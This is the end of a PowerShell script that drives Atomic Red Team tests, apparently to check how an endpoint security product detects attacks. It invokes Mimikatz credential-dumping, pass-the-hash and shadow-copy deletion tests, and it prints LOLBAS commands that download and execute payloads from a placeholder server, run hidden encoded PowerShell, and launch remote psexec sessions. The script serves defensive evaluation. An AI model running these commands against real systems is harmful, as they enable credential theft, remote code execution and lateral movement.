Run-Test -ID "W-196" -Technique "T1490" -TestName "Windows - Delete Volume Shadow Copies via Diskshadow" -TestNumber 13

# ============================================================
# MIMIKATZ EMULATION BLOCK (8 tests)
# ============================================================
Write-Host "`n================================================" -ForegroundColor Magenta
Write-Host " MIMIKATZ EMULATION" -ForegroundColor Magenta
Write-Host "================================================" -ForegroundColor Magenta

# T1003.001 — sekurlsa::logonpasswords
Run-Test -ID "MIM-01" -Technique "T1003.001" -TestName "Mimikatz sekurlsa::logonpasswords" -TestNumber 7 -WaitSec 45

# T1003.002 — SAM dump
Run-Test -ID "MIM-02" -Technique "T1003.002" -TestName "Mimikatz lsadump::sam" -TestNumber 1 -WaitSec 45

# T1003.004 — LSA secrets
Run-Test -ID "MIM-03" -Technique "T1003.004" -TestName "Mimikatz lsadump::secrets" -TestNumber 1 -WaitSec 45

# T1003.006 — DCSync
Run-Test -ID "MIM-04" -Technique "T1003.006" -TestName "Mimikatz lsadump::dcsync" -TestNumber 1 -WaitSec 45

# T1558.003 — Kerberoasting
Run-Test -ID "MIM-05" -Technique "T1558.003" -TestName "Kerberoasting kerberos::list" -TestNumber 1 -WaitSec 45

# T1550.002 — Pass-the-Hash
Run-Test -ID "MIM-06" -Technique "T1550.002" -TestName "Pass-the-Hash sekurlsa::pth" -TestNumber 1 -WaitSec 45

# T1547.005 — SSP injection
Run-Test -ID "MIM-07" -Technique "T1547.005" -TestName "Mimikatz misc::memssp SSP inject" -TestNumber 1 -WaitSec 45

# T1134.001 — Token elevation
Run-Test -ID "MIM-08" -Technique "T1134.001" -TestName "Mimikatz token::elevate" -TestNumber 1 -WaitSec 45


# ============================================================
# MANUAL LOLBAS CHAINS (run manually — novel argument patterns)
# ============================================================
Write-Host "`n================================================" -ForegroundColor Yellow
Write-Host " MANUAL LOLBAS CHAINS — run these manually" -ForegroundColor Yellow
Write-Host "================================================" -ForegroundColor Yellow
Write-Host "LOL-01: certutil -urlcache -split -f http://YOUR_SERVER/test.dll C:\temp\test.dll" -ForegroundColor White
Write-Host "        regsvr32.exe /s /n /u /i:http://YOUR_SERVER/test.sct scrobj.dll" -ForegroundColor White
Write-Host "LOL-02: mshta.exe vbscript:Execute(CreateObject(WScript.Shell).Run powershell -enc aQBkAA==)" -ForegroundColor White
Write-Host "LOL-03: wmic.exe process call create `"powershell -nop -w hidden -enc aQBkAA==`"" -ForegroundColor White
Write-Host "LOL-04: rundll32.exe \\YOUR_SERVER\share\test.dll,DllRegisterServer" -ForegroundColor White
Write-Host "LOL-05: bitsadmin /transfer job /download /priority normal http://YOUR_SERVER/test.exe C:\temp\test.exe" -ForegroundColor White
Write-Host "LOL-06: Create Word doc with macro: Shell `"cmd /c powershell -enc aQBkAA==`"" -ForegroundColor White
Write-Host "LOL-07: psexec.exe \\SECOND_TEST_HOST -u admin -p pass cmd.exe" -ForegroundColor White


# ============================================================
# DONE
# ============================================================
Write-Host "`n================================================" -ForegroundColor Green
Write-Host " ALL ART TESTS COMPLETE" -ForegroundColor Green
Write-Host " Results: C:\s1_eval\art_results.csv" -ForegroundColor Green
Write-Host " RanSim: run manually via RanSim.exe GUI" -ForegroundColor Green
Write-Host " Manual LOLBAS: see LOL blocks above" -ForegroundColor Green
Write-Host "================================================`n" -ForegroundColor Green
Import-Csv $LogPath | Format-Table -AutoSize
